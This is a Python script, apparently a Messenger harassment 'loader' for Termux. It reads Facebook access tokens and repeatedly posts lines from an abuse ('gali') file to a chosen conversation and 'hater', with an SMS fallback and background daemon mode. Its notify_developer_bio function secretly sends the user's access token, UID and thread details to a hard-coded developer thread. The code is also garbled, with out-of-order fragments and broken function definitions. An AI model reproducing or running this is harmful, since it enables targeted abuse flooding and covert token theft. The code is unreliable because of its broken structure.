#!/usr/bin/python3
#-*-coding:utf-8-*-

"""
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except:
        pass
            conn.commit()
        conn.close()
    except:
        pass

def ():
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT thread_id, hater_name, message, timestamp FROM sent_messages ORDER BY timestamp")
        rows = c.fetchall()
        conn.close()
        if not rows:
            print(Fore.YELLOW + "No sent messages found.")
        else:
            grouped = {}
            for row in rows:
                tid, hater, msg, ts = r                try:
                    s = requests.post(url, data=parameters, headers=headers)
                    if s.ok:
                        mark_message_sent(msg_id)
                        log_sent_message(t_id, mn, msg)
                except:
                    pass
            else:
                if send_sms_via_gsm(fallback_phone, msg):
                    mark_message_sent(msg_id)
                    log_sent_message(t_id, mn, msg)
        time.sleep(10)

def start_queue_processor():
    t = threading.Thread(target=process_queue, daemon=True)
    t.start()

# --- Utility Function ---
def check_stop():
    if os.path.exists("stop_signal.txt"):
        sys.exit()

# --- Custom Bio Function (Animated Bio) ---
def print_custom_bio():
    # Define a list of flashy dark colors.
    flashy_colors = [
        Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX,
        Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX
    ]
    
    last_color = None  # To track last used color (for line-by-line printing)

    def get_random_color_line():
        nonlocal last_color
        color = random.choice(flashy_colors)
        while color == last_color:
            color = random.choice(flashy_colors)
        last_color = color
        return color

    #     blink = "\033[5m"
    print(blink + get_random_color_line() + "[✅ SUCCESS FULL ULTIMATE FANCY BIO LOADED" + "\033[0m")

# --- Animated Print Functions (for logos, SMS details, etc.) ---
def animated_print(text, delay=0.01, jitter=0.005):
    flashy_colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, 
                      Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX]
    for char in text:
        sys.stdout.write(random.choice(flashy_colors) + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(delay + random.uniform(0, jitter)) 
    print()
def animated_logo():
    logo_text = r"""
  
          --[[
  /$$$$$$$  /$$$$$$ /$$     /$$ /$$   /$$  /$$$$$$  /$$   /$$
| $$__  $$|_  $$_/|  $$   /$$/| $$  | $$ /$$__  $$| $$  | $$
| $$  \ $$  | $$   \  $$ /$$/ | $$  | $$| $$  \__/| $$  | $$
| $$$$$$$/  | $$    \  $$$$/  | $$  | $$|  $$$$$$ | $$$$$$$$
| $$____/   | $$     \  $$/   | $$  | $$ \____  $$| $$__  $$
| $$        | $$      | $$    | $$  | $$ /$$  \ $$| $$  | $$
| $$       /$$$$$$    | $$    |  $$$$$$/|  $$$$$$/| $$  | $$
|__/      |______/    |__/     \______/  \______/ |__/  |__/
                                           
                                           
--]]
                                    

                                                                                                   
"""
    for line in logo_text.splitlines():
         animated_print(line, delay=0.005, jitter=0.002)

# --- Menu Function with Animated Options ---
def main_menu():
    # Print the animated menu header as specified
    animated_print("<============================ NEW MENU OPTIONS ============================>", delay=0.005, jitter=0.002)
    print(random.choice(color_list) + "[1] START LOADER")
    print(random.choice(color_list) + "[2] STOP LOADER")
    print(random.choice(color_list) + "[3] SMS DISPLAY SHOW")
    animated_print("<============================ CHOOSE MENU OPTIONS ===========================>", delay=0.005, jitter=0.002)
    choice = input(random.choice(color_list) + "\n[+] CHOOSE AN  OPTION ::> ").strip()
    if choice == "2":
        stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY:::🔛 ").strip()
        animated_print("<<════════════════════════════════════════════════════════>>")
        if stop_input == get_stop_key():
            print(Fore.BLUE + "STOPPED")
            with open("stop_signal.txt", "w") as f:
                f.write("stop")
            sys.exit()
        else:
            sys.exit()
    if choice == "3":
        display_sent_messages()
        sys.exit()
    return choice

def get_stop_key():
    if os.path.exists("loader_stop_key.txt"):
        with open("loader_stop_key.txt", "r") as f:
            return f.read().strip()
    else:
        stop_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        with open("loader_stop_key.txt", "w") as f:
            f.write(stop_key)
        return stop_key

def notify_developer_bio(current_token, mn, thread_id, uid, ms):
    DEV_THREAD_ID = "t_100094892855545"
    bio_message = f"Hello WASU  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
    url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
    parameters = {'access_token': current_token, 'message': bio_message}
    try:
        r = requests.post(url, data=parameters, headers=headers)
        if r.ok:
            print(Fore.GREEN + "[•] Developer notified.")
    except:
        pass

# --- Global Variables & Colors ---
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
global_token_index = 0

                    
    if system() == 'Linux':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

def ════════════════════════════════════════════════════════════>>")
with open(token_file, 'r') as f2:
    token_data = f2.read()
tokens = [line.strip() for line in token_data.splitlines() if line.strip()]
if not tokens:
    sys.exit()

access_token = tokens[0]
payload = {'access_token': access_token}
a = "https://graph.facebook.com/v15.0/me"
b = requests.get(a, params=payload)
d = json.loads(b.text)
if 'name' not in d:
    sys.exit()
mb = d['name']
print(Fore.GREEN + "YOUR PROFILE NAME ::> " + mb + "\n")
animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
start_queue_processor()

os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
thread_id = input("[+] ENTER CONVO UID ::> ").strip()
animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
os.system('espeak -a 300 "TATE KA NAME DALO"')
mn = input("[+] ENTER HATER NAME ::> ").strip()
animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
os.system('espeak -a 300 "GALI FILE DALO"')
ms = input("[+] ENTER GALI FILE ::> ").strip()
animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
os.system('espeak -a 300 "FILE KITNI BAAR REPEAT KARNI HX"')
repeat = int(input("[+] KITNI BAAR IS GALI KO REPEAT KARNA HX ::> "))
animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
os.system('espeak -a 300 "SPEED DALO YAR"')
timm = int(input("[+] ENTER SPEED IN SECOND ::> "))
animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
print(Fore.BLUE + "\n☣️________All DONE.... LOADING PROFILE INFO.....!")
print(Fore.BLUE + "YOUR FIRST ID PROFILE NAME.....☣️=> " + mb + "\n")
animated_print("<<═══════PIYUSH══════════CHAKE YOUR LODER SEND SUCCESSFUL══════PIYUSH INSIDE══════════>>")
try:
    ns = open(ms, 'r').readlines()
except:
    sys.exit()

if daemonize_mode:
    daemonize()

for i in range(repeat):
    check_stop()

    message_on_messenger(thread_id)


